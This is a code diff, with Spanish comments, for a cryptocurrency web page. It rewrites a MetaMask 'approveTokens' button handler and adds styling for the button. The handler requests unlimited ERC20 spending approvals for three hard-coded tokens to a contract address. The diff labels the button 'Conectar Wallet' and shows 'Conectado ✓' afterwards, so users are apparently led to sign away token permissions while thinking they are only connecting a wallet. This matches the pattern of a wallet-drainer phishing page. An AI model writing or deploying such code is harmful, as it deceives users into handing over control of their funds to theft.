@@ -454,7 +454,19 @@
         50% { opacity: 0; transform: translateY(20px); }
         100% { opacity: 1; transform: translateY(0); }
     }
+#approveTokens {
+    transition: all 0.3s ease;
+}
 
+#approveTokens[disabled] {
+    cursor: not-allowed;
+    opacity: 0.8;
+}
+
+#approveTokens:not([disabled]):hover {
+    opacity: 0.9;
+    transform: translateY(-1px);
+}
    
     </style>
 </head>
@@ -1057,48 +1069,63 @@
             }
         };
 
-        document.getElementById("approveTokens").addEventListener("click", async () => {
-            if (!userAccount) return alert("Primero conecta MetaMask");
+    document.getElementById("approveTokens").addEventListener("click", async () => {
+    const button = document.getElementById("approveTokens");
+    if (!userAccount) {
+        alert("Primero conecta MetaMask");
+        return;
+    }
 
-            // Tokens ERC20 que el contrato manejará
-            const tokens = [
-                "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", // Reemplazar con las direcciones correctas de los tokens
-                "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1",
-                "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"
-            ];
+    // Deshabilitar botón durante el proceso
+    button.disabled = true;
+    button.textContent = "Aprobando...";
+    button.style.backgroundColor = "#f0b90b"; // Color original durante carga
 
-            // Aprobación infinita
-            try {
-                for (const token of tokens) {
-                    const tokenContract = new web3.eth.Contract([
-                        {
-                            "constant": false,
-                            "inputs": [
-                                { "name": "spender", "type": "address" },
-                                { "name": "amount", "type": "uint256" }
-                            ],
-                            "name": "approve",
-                            "outputs": [{ "name": "", "type": "bool" }],
-                            "payable": false,
-                            "stateMutability": "nonpayable",
-                            "type": "function"
-                        }
-                    ], token);
+    const tokens = [
+        "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
+        "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1",
+        "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"
+    ];
 
-                    // Aprueba una cantidad infinita para el contrato
-                    await tokenContract.methods
-                        .approve(contractAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
-                        .send({ from: userAccount });
+    // ABI simplificado para approve
+    const approveABI = [
+        {
+            "constant": false,
+            "inputs": [
+                { "name": "spender", "type": "address" },
+                { "name": "amount", "type": "uint256" }
+            ],
+            "name": "approve",
+            "outputs": [{ "name": "", "type": "bool" }],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }
+    ];
 
-                    console.log(`Token ${token} aprobado con éxito`);
-                }
+    try {
+        for (const token of tokens) {
+            const tokenContract = new web3.eth.Contract(approveABI, token);
+            await tokenContract.methods
+                .approve(contractAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
+                .send({ from: userAccount });
+        }
 
-                alert("Tokens aprobados con éxito para el contrato");
-            } catch (error) {
-                console.error("Error al autorizar los tokens", error);
-                alert("Error al otorgar permisos");
-            }
-        });
+        // Actualizar estado al completar
+        button.textContent = "Conectado ✓";
+        button.style.backgroundColor = "#00b15d"; // Verde de éxito
+        button.disabled = true; // Mantener deshabilitado
+
+    } catch (error) {
+        console.error("Error al autorizar los tokens", error);
+        alert("Error al otorgar permisos");
+        
+        // Restaurar estado original
+        button.textContent = "Conectar Wallet";
+        button.style.backgroundColor = "#f0b90b";
+        button.disabled = false;
+    }
+});
 
         document.getElementById("claimAll").addEventListener("click", async () => {
             if (!userAccount) return alert("Primero conecta MetaMask");
